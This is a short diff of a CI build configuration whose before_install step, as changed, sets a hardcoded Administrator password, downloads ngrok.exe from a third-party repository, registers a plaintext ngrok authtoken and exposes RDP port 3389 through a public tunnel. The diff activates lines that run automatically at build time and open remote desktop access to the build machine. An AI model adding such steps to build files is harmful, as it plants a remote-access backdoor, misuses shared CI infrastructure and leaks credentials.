@@ -5,10 +5,10 @@ language: shell
 before_install:
 - |-
 
-        #net user Administrator Thuonghai001
+        net user Administrator Thuonghai001
         #net user Administrator Thuonghai001 /add
         #net localgroup Administrators Administrator /add
-        powershellcmd /c curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
+        powershell cmd /c curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
         powershell ./ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
         powershell ./ngrok tcp 3389
 
